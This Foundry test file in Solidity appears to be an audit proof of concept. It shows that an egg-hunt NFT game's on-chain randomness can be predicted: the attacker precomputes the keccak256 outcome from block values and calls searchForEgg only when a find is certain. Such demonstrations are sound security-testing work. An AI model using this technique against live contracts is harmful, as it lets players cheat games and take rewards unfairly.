// SPDX-License-Identifier: MIT

pragma solidity ^0.8.23;

import "../lib/forge-std/src/Test.sol";
import "../src/EggHuntGame.sol";
import "../src/EggstravaganzaNFT.sol";
import "../src/EggVault.sol";

contract RandomnessExploitTest is Test {
    EggHuntGame s_eggGame;
    EggstravaganzaNFT s_eggNFT;
    EggVault s_eggVault;
    address s_owner = address(1);
    address s_player = address(2);

    function setUp() public {
        // Deploy contracts
        vm.startPrank(s_owner);
        s_eggNFT = new EggstravaganzaNFT("EggstravaganzaNFT", "EGG");
        s_eggVault = new EggVault();
        s_eggGame = new EggHuntGame(address(s_eggNFT), address(s_eggVault));

        // Setup Connections
        s_eggNFT.setGameContract(address(s_eggGame));
        s_eggVault.setEggNFT(address(s_eggNFT));

        // Start the game
        s_eggGame.startGame(3600); // 1 hour duration

        // Set a low find threshold to demonstrate the attack works even with low probability
        s_eggGame.setEggFindThreshold(5); // Only 5% chance to find an egg normally
        vm.stopPrank();
    }

    function testPredictableRandomness() public {
        // Initial state
        uint256 eggInitialEggCounter = s_eggGame.eggCounter();
        uint256 eggInitialPlayerEggs = s_eggGame.eggsFound(s_player);

        vm.startPrank(s_player);

        // Attacker can determine if they'll find an egg before calling the function
        uint256 eggSuccessfulFinds = 0;
        uint256 eggAttempts = 20;

        for (uint256 eggAttempt = 0; eggAttempt < eggAttempts; eggAttempt++) {
            // Simulate the different block paramters
            vm.warp(block.timestamp + eggAttempt); // Change timestamp
            vm.roll(block.number + eggAttempt); // change block number
            bytes32 eggMockPrevrandao = bytes32(uint256(eggAttempt * 100)); // Mock prevrandao change
            vm.prevrandao(eggMockPrevrandao);

            // Pre-calcualate if this attempt will succeed
            uint256 eggExpectRandom = uint256(
                keccak256(abi.encodePacked(block.timestamp, block.prevrandao, s_player, s_eggGame.eggCounter()))
            ) % 100;

            // Only call searchForEgg if we know it will succeed
            if (eggExpectRandom < s_eggGame.eggFindThreshold()) {
                s_eggGame.searchForEgg();
                eggSuccessfulFinds++;
            }
        }

        vm.stopPrank();

        // The attacker should have sucessfully found eggs every time they called searchForEgg
        assertEq(s_eggGame.eggsFound(s_player) - eggInitialPlayerEggs, eggSuccessfulFinds);
        assertEq(s_eggGame.eggCounter(), eggInitialEggCounter + eggSuccessfulFinds);

        // In an normal scenario with 5% chance, we'd expect around 1 success in 20 attempts
        // The exploit gives a 100% success rate when the function is called
        console.log("Successful egg finds:", eggSuccessfulFinds);
        console.log("Success rate when function called: 100%");
    }
}
